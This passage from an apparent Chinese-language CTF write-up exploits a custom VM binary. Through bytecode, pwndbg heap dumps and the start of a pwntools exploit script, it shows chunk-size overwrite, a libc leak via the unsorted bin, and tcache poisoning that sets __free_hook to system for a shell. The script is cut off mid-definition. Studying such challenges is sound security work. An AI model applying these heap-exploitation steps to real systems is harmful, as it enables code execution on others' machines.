class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">1</span>))</span><br></pre></td></tr></table></figure>\n<p>思路就是我们通过 push (imm32) 来将 rsp 变得比较大，下面的 chunk 最开始是未分配，还是 topchunk，而程序会连续的 malloc，free 用于储存 content 的 chunk。我已为了构造一个较大的空间，我们连续的申请出 0x10,0x20,0x30,0x40…0xe0 的空间用看来布置 fakechunk.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79000</span><br><span class=\"line\">Size: 0x251</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79250</span><br><span class=\"line\">Size: 0x331</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79580</span><br><span class=\"line\">Size: 0x71</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e795f0</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79610</span><br><span class=\"line\">Size: 0x31</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\">~~~~~</span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79ac0</span><br><span class=\"line\">Size: 0xd1</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79b90</span><br><span class=\"line\">Size: 0xe1</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79c70</span><br><span class=\"line\">Size: 0x20391</span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>通过溢出，我们修改第一个 chunk 的 size 为 largebin 的范围.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code.append(write(<span class=\"number\">0x21</span>,<span class=\"number\">0x4</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x20</span>,<span class=\"number\">0xd1</span>))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">结果如下，</span><br><span class=\"line\">pwndbg&gt; x/28gx 0x55a9a9e79580</span><br><span class=\"line\">0x55a9a9e79580:\t0x0000000000000000\t0x0000000000000071</span><br><span class=\"line\">0x55a9a9e79590:\t0xffffffffffffffff\t0xffffffffffffffff</span><br><span class=\"line\">0x55a9a9e795a0:\t0xffffffffffffffff\t0xffffffffffffffff</span><br><span class=\"line\">0x55a9a9e795b0:\t0xffffffffffffffff\t0xffffffffffffffff</span><br><span class=\"line\">0x55a9a9e795c0:\t0xffffffffffffffff\t0xffffffffffffffff</span><br><span class=\"line\">0x55a9a9e795d0:\t0xffffffffffffffff\t0x0000000000000000</span><br><span class=\"line\">0x55a9a9e795e0:\t0x0000000000000000\t0x00000000000000ee</span><br><span class=\"line\">0x55a9a9e795f0:\t0x0000000000000000\t0x00000000000004d1</span><br><span class=\"line\">0x55a9a9e79600:\t0x0000000000000000\t0x000055a9a9e79010</span><br><span class=\"line\"></span><br><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79000</span><br><span class=\"line\">Size: 0x251</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79250</span><br><span class=\"line\">Size: 0x331</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79580</span><br><span class=\"line\">Size: 0x71</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e795f0</span><br><span class=\"line\">Size: 0x4d1</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79ac0</span><br><span class=\"line\">Size: 0xd1</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79b90</span><br><span class=\"line\">Size: 0xe1</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这样释放的时候，就不会进入 tcache。而是进入 unsortedbins，对于 content，会检查换行符，但是如果我们申请的是 8 字节，虽然同样会返回 0x20 的空间，但是，chunk 的 bk 可以被 % s 通泄露出来.(因为原本 0x20 的 chunk 被我们修改为 laegechunk 进入 unsortedbins)，tcache 没有符合要求的 chunk, 从 unsortedbins 里切割出来，bk 可以泄露 libc 的地址。</p>\n<p>下面的操作原理跟上面的一样，因为我们连续申请的一系列 chunk，存在 tcache 里面，所以，再次利用刚刚从 unsortedbins 切割出来的 chunk，(堆头和我们最开始 malloc (0x10) 一样，刚刚我们申请出来 0x20 的空间，接着马上被释放进入了 tcache，此时，tcache 的 bins 种都有一个 chunk, 我们希望通过修改其 fd 来获取目标地址。所以，我们还是把 0x20 的 chunk 拿出来，总比不过，我们向让她出来就不要再回去 0x20 的 tcachebin，而是其他位置，所以我们申请之前，再次通过越界修改他的 chunsize，我这里修改为 0x41, 这样再次申请释放后，其进入对应的 bins,fd 不为空。我这里并没有把 chunk 放入 unsortedbins 后直接申请 8 字节的空间，而是 malloc (0xf0)，下一次在 malloc (0x8)，结果是一样的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">修改前</span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5640fd90c5f0</span><br><span class=\"line\">Size: 0x101</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">0x30 [  1]: 0x5640fd90c620 ◂— 0x11</span><br><span class=\"line\">0x40 [  1]: 0x5640fd90c650 ◂— 0x11</span><br><span class=\"line\">0x50 [  1]: 0x5640fd90c690 ◂— 0x11</span><br><span class=\"line\">0x60 [  1]: 0x5640fd90c6e0 ◂— 0x0</span><br><span class=\"line\">0x70 [  1]: 0x5640fd90c740 ◂— 0x0</span><br><span class=\"line\">0x80 [  1]: 0x5640fd90c7b0 ◂— 0x0</span><br><span class=\"line\">0x90 [  1]: 0x5640fd90c830 ◂— 0x0</span><br><span class=\"line\">0xa0 [  1]: 0x5640fd90c8c0 ◂— 0x0</span><br><span class=\"line\">0xb0 [  1]: 0x5640fd90c960 ◂— 0x0</span><br><span class=\"line\">0xc0 [  1]: 0x5640fd90ca10 ◂— 0x0</span><br><span class=\"line\">0xd0 [  1]: 0x5640fd90cad0 ◂— 0x0</span><br><span class=\"line\">0xe0 [  1]: 0x5640fd90cba0 ◂— 0x0</span><br><span class=\"line\">0x100 [  1]: 0x5640fd90c600 ◂— 0x0</span><br><span class=\"line\"></span><br><span class=\"line\">修改后申请、释放</span><br><span class=\"line\">0x20 [  1]: 0x5640fd90c700 ◂— 0x0</span><br><span class=\"line\">0x30 [  1]: 0x5640fd90c620 ◂— 0x0</span><br><span class=\"line\">0x40 [  2]: 0x5640fd90c600 —▸ 0x5640fd90c650 ◂— 0x0</span><br><span class=\"line\">0x50 [  1]: 0x5640fd90c690 ◂— 0x11</span><br><span class=\"line\">0x60 [  1]: 0x5640fd90c6e0 ◂— 0x0</span><br><span class=\"line\">0x70 [  1]: 0x5640fd90c740 ◂— 0x0</span><br><span class=\"line\">0x80 [  1]: 0x5640fd90c7b0 ◂— 0x0</span><br><span class=\"line\">0x90 [  1]: 0x5640fd90c830 ◂— 0x0</span><br><span class=\"line\">0xa0 [  1]: 0x5640fd90c8c0 ◂— 0x0</span><br><span class=\"line\">0xb0 [  1]: 0x5640fd90c960 ◂— 0x0</span><br><span class=\"line\">0xc0 [  1]: 0x5640fd90ca10 ◂— 0x0</span><br><span class=\"line\">0xd0 [  1]: 0x5640fd90cad0 ◂— 0x0</span><br><span class=\"line\">0xe0 [  1]: 0x5640fd90cba0 ◂— 0x0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>然后，我们还是通过越界，这次直接修改 chunk 的 fd 指针指向__free_hook-8, 因为 malloc 之后，会紧接着就释放 chunk，我们需要同时完成__free_hook 改写为 system，还要保证指针指向的内容是 “/bin/sh\\x00”。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; bins</span><br><span class=\"line\">tcachebins</span><br><span class=\"line\">0x20 [  1]: 0x55bd2778d700 ◂— 0x0</span><br><span class=\"line\">0x30 [  1]: 0x55bd2778d620 ◂— 0x0</span><br><span class=\"line\">0x40 [  2]: 0x55bd2778d600 —▸ 0x7fd5cab318e0 (__after_morecore_hook) ◂— 0x0</span><br><span class=\"line\">0x50 [  1]: 0x55bd2778d690 ◂— 0x11</span><br><span class=\"line\">0x60 [  1]: 0x55bd2778d6e0 ◂— 0x0</span><br><span class=\"line\">0x70 [  1]: 0x55bd2778d740 ◂— 0x0</span><br><span class=\"line\">0x80 [  1]: 0x55bd2778d7b0 ◂— 0x0</span><br><span class=\"line\">0x90 [  1]: 0x55bd2778d830 ◂— 0x0</span><br><span class=\"line\">0xa0 [  1]: 0x55bd2778d8c0 ◂— 0x0</span><br><span class=\"line\">0xb0 [  1]: 0x55bd2778d960 ◂— 0x0</span><br><span class=\"line\">0xc0 [  1]: 0x55bd2778da10 ◂— 0x0</span><br><span class=\"line\">0xd0 [  1]: 0x55bd2778dad0 ◂— 0x0</span><br><span class=\"line\">0xe0 [  1]: 0x55bd2778dba0 ◂— 0x0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; bins</span><br><span class=\"line\">tcachebins</span><br><span class=\"line\">0x20 [  1]: 0x55bd2778d700 ◂— 0x0</span><br><span class=\"line\">0x30 [  1]: 0x55bd2778d620 ◂— 0x0</span><br><span class=\"line\">0x40 [  1]: 0x7fd5cab318e0 (__after_morecore_hook) ◂— 0x0</span><br><span class=\"line\">0x50 [  1]: 0x55bd2778d690 ◂— 0x11</span><br><span class=\"line\">0x60 [  1]: 0x55bd2778d6e0 ◂— 0x0</span><br><span class=\"line\">0x70 [  1]: 0x55bd2778d740 ◂— 0x0</span><br><span class=\"line\">0x80 [  1]: 0x55bd2778d7b0 ◂— 0x0</span><br><span class=\"line\">0x90 [  1]: 0x55bd2778d830 ◂— 0x0</span><br><span class=\"line\">0xa0 [  1]: 0x55bd2778d8c0 ◂— 0x0</span><br><span class=\"line\">0xb0 [  1]: 0x55bd2778d960 ◂— 0x0</span><br><span class=\"line\">0xc0 [  1]: 0x55bd2778da10 ◂— 0x0</span><br><span class=\"line\">0xd0 [  1]: 0x55bd2778dad0 ◂— 0x0</span><br><span class=\"line\">0xe0 [  1]: 0x55bd2778dba0 ◂— 0x0</span><br><span class=\"line\">0x100 [  1]: 0x55bd2778d600 ◂— 0x0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最后的效果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; tel 0x7fd5cab318e0</span><br><span class=\"line\">00:0000│ rsi 0x7fd5cab318e0 (__after_morecore_hook) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class=\"line\">01:0008│     0x7fd5cab318e8 (__free_hook) —▸ 0x7fd5ca793420 (system) </span><br></pre></td></tr></table></figure>\n<h2 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./planecoode&#x27;</span>)</span><br><span class=\"line\">elf =ELF(<span class=\"string\">&#x27;./planecoode&#x27;</span>)</span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\"><span class=\"comment\">#context.log_level =&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#code highest byte is 0x6</span></span><br><span class=\"line\">incx = <span class=\"number\">0x0600000000000000</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pop1</span>():\t\t\t\t<span class=\"comment\">#0xcc</span></span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0xcc</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">po4</span>():</span><br><span class=\"line\">\tpayload =incx +<span class=\"number\">0x98</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x12</span> + i&lt;&lt;<span class=\"number\">8</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">reset</span>():</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x13</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">xor</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx +<span class=\"number\">0x33</span> + i&lt;&lt;<span class=\"number\">8</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">push1</span>():</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x36</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">div</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x41</span> + i&lt;&lt;<span class=\"number\">8</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">push4</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx +<span class=\"number\">0x45</span> +i*<span class=\"number\">0x100</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">jmp</span>(<span class=\"params\">x,y</span>):</span><br><span class=\"line\">\tpayload = <span class=\"number\">0x0800000000000000</span> + <span class=\"number\">0x49</span> + (y*<span class=\"number\">0x1000000</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x52</span> + i*<span class=\"number\">0x100</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sub</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x6a</span> + i*<span class=\"number\">0x100</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">printc</span>():</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x54</span> </span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">malloc</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0xcd</span> +n*<span class=\"number\">0x100</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exit</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> incx + <span class=\"number\">0xd1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span 